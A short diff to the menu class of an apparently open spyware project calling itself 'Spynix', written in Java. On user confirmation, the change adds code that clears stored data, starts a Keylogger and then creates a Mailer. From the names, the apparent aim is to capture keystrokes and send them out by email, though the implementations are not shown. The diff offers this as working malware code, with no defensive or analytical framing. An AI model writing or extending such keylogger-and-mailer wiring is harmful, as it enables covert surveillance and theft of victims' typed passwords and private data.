@@ -1,6 +1,7 @@
 package ml.inix.menu;
 
 import ml.inix.Config;
+import ml.inix.loggers.Keylogger;
 import ml.inix.service.Mailer;
 import ml.inix.util.Color;
 import ml.inix.util.FileManager;
@@ -79,9 +80,11 @@ public class Menu {
         while (confirmText.trim().isEmpty());
 
         if (confirmText.trim().equalsIgnoreCase("y")) {
+            Log.out(Color.CYAN + "[*] Spynix initiated...");
             FileManager.createReqFiles();
+            FileManager.clearAllData();
+            Keylogger.init();
             new Mailer();
-            //TODO
         }
         else if (confirmText.trim().equalsIgnoreCase("n")) {
             Log.wait(1);
